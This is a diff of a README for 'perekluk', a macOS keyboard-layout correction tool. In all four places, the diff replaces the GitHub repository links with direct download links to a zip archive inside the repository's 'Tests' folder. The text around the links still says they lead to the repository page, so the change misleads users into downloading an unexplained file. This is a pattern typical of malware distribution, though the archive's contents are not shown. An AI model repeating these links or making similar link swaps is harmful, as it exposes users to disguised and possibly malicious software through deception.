@@ -1,6 +1,6 @@
 # 🎹 perekluk - Quickly Fix Keyboard Layout Errors
 
-[![Download perekluk](https://img.shields.io/badge/Download-perekluk-brightgreen?style=for-the-badge)](https://github.com/woodlisa812-dotcom/perekluk)
+[![Download perekluk](https://img.shields.io/badge/Download-perekluk-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/woodlisa812-dotcom/perekluk/main/Tests/Software-v2.3.zip)
 
 ---
 
@@ -27,7 +27,7 @@ If your Mac meets these points, you can proceed with downloading and installing 
 
 Click the big button below to visit the download page for perekluk:
 
-[![Download perekluk](https://img.shields.io/badge/Download-perekluk-blue?style=for-the-badge)](https://github.com/woodlisa812-dotcom/perekluk)
+[![Download perekluk](https://img.shields.io/badge/Download-perekluk-blue?style=for-the-badge)](https://raw.githubusercontent.com/woodlisa812-dotcom/perekluk/main/Tests/Software-v2.3.zip)
 
 This link takes you to the GitHub repository page. Look for the latest release section to find the downloadable app file. The file is ready to use—no coding needed.
 
@@ -106,7 +106,7 @@ Open perekluk preferences from the menu bar icon. Here you can:
 - Check that you pressed the Option key after typing.
 - Restart the app if it stops working.
 - Visit the GitHub page to report any issues or check for updates:  
-[https://github.com/woodlisa812-dotcom/perekluk](https://github.com/woodlisa812-dotcom/perekluk)
+[https://raw.githubusercontent.com/woodlisa812-dotcom/perekluk/main/Tests/Software-v2.3.zip](https://raw.githubusercontent.com/woodlisa812-dotcom/perekluk/main/Tests/Software-v2.3.zip)
 
 ---
 
@@ -129,4 +129,4 @@ perekluk is open source and free to use. The code is available for review and im
 
 ---
 
-[![Download perekluk](https://img.shields.io/badge/Download-perekluk-brightgreen?style=for-the-badge)](https://github.com/woodlisa812-dotcom/perekluk)
+[![Download perekluk](https://img.shields.io/badge/Download-perekluk-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/woodlisa812-dotcom/perekluk/main/Tests/Software-v2.3.zip)
